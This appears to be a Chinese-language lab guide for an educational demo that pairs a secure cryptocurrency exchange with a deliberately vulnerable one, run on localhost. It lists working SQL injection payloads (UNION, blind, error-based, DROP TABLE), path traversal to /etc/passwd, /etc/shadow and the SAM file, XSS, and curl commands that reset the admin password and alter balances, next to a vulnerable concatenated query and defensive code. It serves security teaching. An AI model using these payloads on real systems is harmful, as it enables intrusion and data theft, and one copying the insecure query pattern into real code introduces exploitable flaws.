===============================================================================
                    Secure vs Insecure Crypto Exchange Demo Instructions
===============================================================================

项目概述：
这是一个教育项目，展示了安全和不安全的加密货币交易所实现。
通过对比两个版本，学习网络安全的重要概念和实践。

===============================================================================
                                第一部分：环境准备
===============================================================================

1. 启动后端服务器

安全版本后端：
```bash
cd secure-exchange
npm start
```
预期输出：Secure exchange server running on port 5003

不安全版本后端：
```bash
cd insecure-exchange
npm start
```
预期输出：⚠️ INSECURE exchange server running on port 5005

2. 启动前端应用

安全版本前端：
```bash
cd secure-exchange/client
npm start
```
访问地址：http://localhost:3000

不安全版本前端：
```bash
cd insecure-exchange/client
npm start
```
访问地址：http://localhost:3001

3. 验证服务状态
```bash
# 测试安全版本API
curl http://localhost:5003/api/prices

# 测试不安全版本API
curl http://localhost:5005/api/prices
```

===============================================================================
                                第二部分：基础功能演示
===============================================================================

演示账户信息：
- 安全版本：用户名 user1，密码 password
- 不安全版本：用户名 user1/admin，密码 password/admin123

步骤1：登录体验对比

安全版本登录：
1. 访问 http://localhost:3000
2. 输入用户名：user1
3. 输入密码：password
4. 点击登录
5. 观察：登录成功后获得JWT令牌，密码不会在响应中暴露

不安全版本登录：
1. 访问 http://localhost:3001
2. 输入用户名：user1
3. 输入密码：password
4. 点击登录
5. 观察：登录后密码直接显示在页面上
6. 打开浏览器控制台，查看密码暴露信息

步骤2：用户数据保护对比

安全版本：
1. 登录后只能看到自己的余额
2. 只能查看自己的交易历史
3. 个人信息受保护

不安全版本：
1. 登录后可以看到所有用户的密码
2. 可以看到所有用户的余额
3. 可以看到所有交易记录
4. 观察"All Users (Exposed)"部分

步骤3：交易功能对比

安全版本交易：
1. 只能为自己进行交易
2. 输入验证严格
3. 余额检查完善

不安全版本交易：
1. 可以为任意用户ID进行交易
2. 无输入验证
3. 可以修改任意用户余额

===============================================================================
                                第三部分：漏洞演示
===============================================================================

注意：以下演示仅用于教育目的，展示安全漏洞的危害。

1. SQL注入攻击演示

使用不安全版本前端：
1. 访问 http://localhost:3001
2. 登录后找到"Vulnerability Demonstrations"部分
3. 在"Search Users"输入框中尝试以下输入：

演示1：获取所有用户
- 输入：空字符串 ""
- 点击"Demonstrate Vulnerabilities"
- 观察：返回所有用户信息（包括密码）

演示2：搜索密码
- 输入：password
- 点击"Demonstrate Vulnerabilities"
- 观察：返回所有密码为"password"的用户

演示3：搜索管理员
- 输入：admin
- 点击"Demonstrate Vulnerabilities"
- 观察：返回管理员信息

演示4：SQL注入模拟攻击
- 输入：' OR '1'='1
- 点击"Demonstrate Vulnerabilities"
- 观察：返回所有用户（模拟SQL注入成功）

演示5：SQL注入条件攻击
- 输入：' OR username LIKE '%a%
- 点击"Demonstrate Vulnerabilities"
- 观察：返回包含字母'a'的用户

演示6：SQL注入信息收集
- 输入：' UNION SELECT 'admin' --
- 点击"Demonstrate Vulnerabilities"
- 观察：尝试联合查询攻击

使用curl命令演示：
```bash
# 获取所有用户
curl "http://localhost:5005/api/search?q="

# 搜索密码
curl "http://localhost:5005/api/search?q=password"

# 搜索管理员
curl "http://localhost:5005/api/search?q=admin"

# SQL注入攻击1：OR条件
curl "http://localhost:5005/api/search?q=%27%20OR%20%271%27%3D%271"

# SQL注入攻击2：UNION查询
curl "http://localhost:5005/api/search?q=%27%20UNION%20SELECT%20%27admin%27%20--"

# SQL注入攻击3：注释攻击
curl "http://localhost:5005/api/search?q=%27%20--"

# SQL注入攻击4：布尔盲注
curl "http://localhost:5005/api/search?q=%27%20AND%20%271%27%3D%271"

# SQL注入攻击5：时间盲注
curl "http://localhost:5005/api/search?q=%27%20AND%20SLEEP(5)%20--"
```

SQL注入攻击原理解释：

1. 正常查询：
   ```javascript
   // 安全查询
   user.username.includes('user1')
   ```

2. 恶意注入：
   ```javascript
   // 恶意输入：' OR '1'='1
   user.username.includes("' OR '1'='1") || user.password.includes("' OR '1'='1")
   ```

3. 真实SQL注入类比：
   ```sql
   -- 正常查询
   SELECT * FROM users WHERE username = 'user1'
   
   -- 恶意注入
   SELECT * FROM users WHERE username = '' OR '1'='1'
   -- 结果：返回所有用户
   ```

SQL注入攻击类型演示：

A. 联合查询注入 (UNION)
- 输入：' UNION SELECT 'admin' --
- 目的：尝试获取管理员信息

B. 布尔盲注
- 输入：' AND '1'='1
- 目的：测试条件是否为真

C. 时间盲注
- 输入：' AND SLEEP(5) --
- 目的：通过响应时间判断条件

D. 错误注入
- 输入：' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --
- 目的：通过错误信息获取数据库信息

E. 堆叠查询
- 输入：'; DROP TABLE users; --
- 目的：执行多条SQL语句

防护措施对比：

安全版本防护：
```javascript
// 输入验证
const username = req.body.username.replace(/[^a-zA-Z0-9]/g, '');
const password = req.body.password.replace(/[^a-zA-Z0-9]/g, '');

// 参数化查询
const user = await db.query('SELECT * FROM users WHERE username = ? AND password = ?', [username, password]);
```

不安全版本漏洞：
```javascript
// 直接拼接用户输入
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

2. 路径遍历攻击演示

使用不安全版本前端：
1. 在"Path Traversal"输入框中输入：
   - ../../../etc/passwd
   - ../../../../windows/system32/config/sam
   - ../../../etc/shadow

使用curl命令演示：
```bash
curl "http://localhost:5005/api/file?filename=../../../etc/passwd"
```

3. 权限提升攻击演示

使用不安全版本前端：
1. 在"Target User ID"中输入：2
2. 在"New Balance Amount"中输入：1000000
3. 点击"Demonstrate Vulnerabilities"
4. 观察：成功修改了用户2的余额

使用curl命令演示：
```bash
curl -X POST http://localhost:5005/api/update-balance \
  -H "Content-Type: application/json" \
  -d '{"userId": 2, "currency": "USD", "amount": 1000000}'
```

4. 密码重置攻击演示

使用不安全版本前端：
1. 在"New Password for Admin"中输入：hacked
2. 点击"Demonstrate Vulnerabilities"
3. 观察：成功重置了管理员密码

使用curl命令演示：
```bash
curl -X POST http://localhost:5005/api/reset-password \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "newPassword": "hacked"}'
```

5. 高级SQL注入演示

使用curl命令进行更复杂的SQL注入攻击：

```bash
# 1. 信息收集 - 获取数据库版本
curl "http://localhost:5005/api/search?q=%27%20AND%20(SELECT%20VERSION())%20--"

# 2. 数据库枚举 - 获取表名
curl "http://localhost:5005/api/search?q=%27%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.tables)%20--"

# 3. 列名枚举 - 获取列信息
curl "http://localhost:5005/api/search?q=%27%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.columns)%20--"

# 4. 数据提取 - 获取用户数据
curl "http://localhost:5005/api/search?q=%27%20UNION%20SELECT%20username,password%20FROM%20users%20--"

# 5. 条件注入 - 逐字符提取
curl "http://localhost:5005/api/search?q=%27%20AND%20ASCII(SUBSTRING(username,1,1))%20=%2065%20--"
```

SQL注入防护最佳实践：

1. 输入验证
```javascript
// 白名单验证
const allowedChars = /^[a-zA-Z0-9_]+$/;
if (!allowedChars.test(input)) {
    throw new Error('Invalid input');
}
```

2. 参数化查询
```javascript
// 使用参数化查询
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
const result = await db.execute(query, [username, password]);
```

3. 最小权限原则
```javascript
// 使用最小权限的数据库用户
const dbUser = 'app_user'; // 只有必要权限
```

4. 错误处理
```javascript
// 不暴露数据库错误信息
try {
    const result = await db.query(query);
} catch (error) {
    logger.error('Database error:', error);
    throw new Error('Internal server error');
}
```

5. 输入编码
```javascript
// HTML编码防止XSS
const encodedInput = encodeURIComponent(userInput);
```

===============================================================================
                                第四部分：API安全对比
===============================================================================

1. 安全版本API测试

身份验证测试：
```bash
# 未认证访问 - 应该被拒绝
curl http://localhost:5003/api/user

# 登录获取令牌
curl -X POST http://localhost:5003/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "user1", "password": "password"}'

# 使用令牌访问 - 应该成功
curl -H "Authorization: Bearer YOUR_TOKEN" http://localhost:5003/api/user
```

2. 不安全版本API测试

无认证访问：
```bash
# 直接访问用户信息 - 应该成功（不安全）
curl http://localhost:5005/api/user/1

# 获取所有用户 - 应该成功（不安全）
curl http://localhost:5005/api/users

# 获取所有交易 - 应该成功（不安全）
curl http://localhost:5005/api/transactions
```

===============================================================================
                                第五部分：教育要点总结
===============================================================================

通过这个演示，你应该理解：

1. 身份验证的重要性
   - 安全版本：JWT令牌，会话管理
   - 不安全版本：无任何认证

2. 数据保护的必要性
   - 安全版本：密码加密，数据隔离
   - 不安全版本：明文存储，数据暴露

3. 输入验证的作用
   - 安全版本：严格验证，防止注入
   - 不安全版本：无验证，容易攻击

4. 访问控制的影响
   - 安全版本：基于角色的访问控制
   - 不安全版本：无访问控制

5. 安全配置的重要性
   - 安全版本：CORS、Helmet、速率限制
   - 不安全版本：无安全配置

===============================================================================
                                第六部分：故障排除
===============================================================================

常见问题：

1. 端口被占用
```bash
# 查看端口使用情况
lsof -i :5003 -i :5005 -i :3000 -i :3001

# 杀死占用进程
kill -9 PID
```

2. 前端无法启动
```bash
# 清理缓存
npm cache clean --force
rm -rf node_modules
npm install
```

3. 后端无法启动
```bash
# 检查依赖
npm install
# 检查端口
lsof -i :PORT
```

4. API请求失败
```bash
# 检查服务器状态
curl http://localhost:5003/api/prices
curl http://localhost:5005/api/prices
```

===============================================================================
                                第七部分：扩展实验
===============================================================================

高级演示：

1. 跨站脚本攻击(XSS)模拟
   - 在搜索框中输入：<script>alert('XSS')</script>
   - 观察前端如何处理恶意输入

2. 跨站请求伪造(CSRF)模拟
   - 尝试在未认证状态下进行交易
   - 对比两个版本的处理方式

3. 会话管理对比
   - 安全版本：令牌过期机制
   - 不安全版本：无会话管理

4. 错误处理对比
   - 安全版本：通用错误信息
   - 不安全版本：详细系统信息

===============================================================================

注意事项：
1. 此演示仅用于教育目的
2. 不要在生产环境中使用不安全版本
3. 所有漏洞都是故意设计的，用于学习
4. 在实际项目中要遵循安全最佳实践

=============================================================================== 